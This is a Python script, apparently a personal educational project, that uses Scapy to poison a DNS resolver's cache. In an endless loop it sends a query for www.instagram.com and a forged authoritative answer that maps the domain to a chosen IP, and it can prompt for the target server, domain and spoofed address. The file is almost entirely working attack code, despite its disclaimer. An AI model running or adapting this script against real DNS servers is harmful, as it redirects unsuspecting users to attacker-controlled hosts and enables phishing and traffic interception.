"""
This is a DNS spoofing script using Scapy.

This script sends a DNS query to a specified server and then sends a spoofed response to the same server.
The spoofed response contains a specified IP address for a specified domain.

This script is for educational purposes only. DNS spoofing is illegal and unethical.

Usage:
    python dns_spoof.py
    
Author:
    aoyu (ngaoyu27@gmail.com)
    
Version:
    1.0
    
Date:
    8 June 2024
"""

from scapy.all import *
import threading


def query_for_config():
    """
    Gets the configuration for the DNS spoofing attack from the user.
    """
    
    server_ip = input("Enter the IP of the DNS server to attack: ")
    query_domain = input("Enter the domain to spoof: ")
    spoofed_ip = input("Enter the IP to which you want to spoof the domain: ")
    
    return server_ip, query_domain, spoofed_ip


def manual_config():
    """
    Manually sets the configuration for the DNS spoofing attack.
    """
    
    server_ip = "10.0.0.150"
    query_domain = "www.instagram.com"
    spoofed_ip = "192.168.56.12"

    return server_ip, query_domain, spoofed_ip


def send_dns_query(server_ip: str, query_domain: str) -> None:
    """
    Sends a DNS query to the specified server for the specified domain.
    
    Args:
        server_ip (str): The IP address of the DNS server.
        query_domain (str): The domain name to query.
    """
    try:
        dns_query = IP(dst=server_ip)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname=query_domain))
        send(dns_query)
        print(f"Sent DNS query for {query_domain} to {server_ip}")
        
    except Exception as e:
        print("Error: ", e)


def send_spoofed_response(server_ip: str, query_domain: str, spoofed_ip: str) -> None:
    """
    Sends a spoofed DNS response to the specified server for the specified domain with the specified IP.
    
    Args:
        server_ip (str): The IP address of the DNS server.
        query_domain (str): The domain name to spoof.
        spoofed_ip (str): The IP address to use in the spoofed response.
    """
    try:
        dns_response = IP(dst=server_ip)/UDP(dport=53)/DNS(
            id=20000,
            qr=1,
            aa=1,
            qd=DNSQR(qname=query_domain),
            an=DNSRR(rrname=query_domain, ttl=300, rdata=spoofed_ip)
        )
        send(dns_response)
        print(f"Sent spoofed response for {query_domain} with IP {spoofed_ip} to {server_ip}")

    except Exception as e:
        print("Error: ", e)


def main():
    # server_ip, query_domain, spoofed_ip = query_for_config()
    server_ip, query_domain, spoofed_ip = manual_config()

    while True:
        query_thread = threading.Thread(target=send_dns_query, args=(server_ip, query_domain))
        spoof_thread = threading.Thread(target=send_spoofed_response, args=(server_ip, query_domain, spoofed_ip))

        query_thread.start()
        spoof_thread.start()
        
        query_thread.join()
        spoof_thread.join()

if __name__ == "__main__":
    main()
